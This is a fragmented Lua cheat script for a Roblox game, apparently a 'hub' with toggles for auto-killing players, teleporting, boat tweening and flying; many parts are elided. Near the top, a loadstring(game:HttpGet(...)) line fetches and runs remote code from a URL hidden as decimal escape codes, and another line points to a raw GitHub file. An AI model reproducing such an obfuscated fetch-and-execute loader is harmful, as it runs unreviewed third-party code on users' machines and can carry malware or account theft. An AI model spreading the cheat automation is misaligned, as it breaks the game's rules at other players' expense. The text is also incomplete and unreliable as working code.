local a = "https://raw.githubusercontent.com/Tienvn123tkvn/Ziner-hub/main/zinerhubontop.txt"
...
loadstring(game:HttpGet(('\104\116\116\112\115\58\47\47\99\100\110\46\116\105\101\110\116\105\110\121\46\115\112\97\99\101\47\97\112\105\46\108\117\97\10'))()warn(_G.Print)
---------
...
RaceV4Section:AddToggle({
	...
	Flag = "Auto Kill Player",
	Value = _G.Settings.AutoKillPlayer,
	Callback = function(value)
...
Mirage:AddToggle{
	Name = "TP To Advanced Fruit Dealer",
...
NewEvent:AddToggle({
    ...
    Callback = function(value)
		...
		NewEvent:AddToggle({
			Name = "Tween Boat to Zone Select",
	...
	MiscSection:AddButton({Name = "Function Fly",Callback = function()
		Fly()
		end})
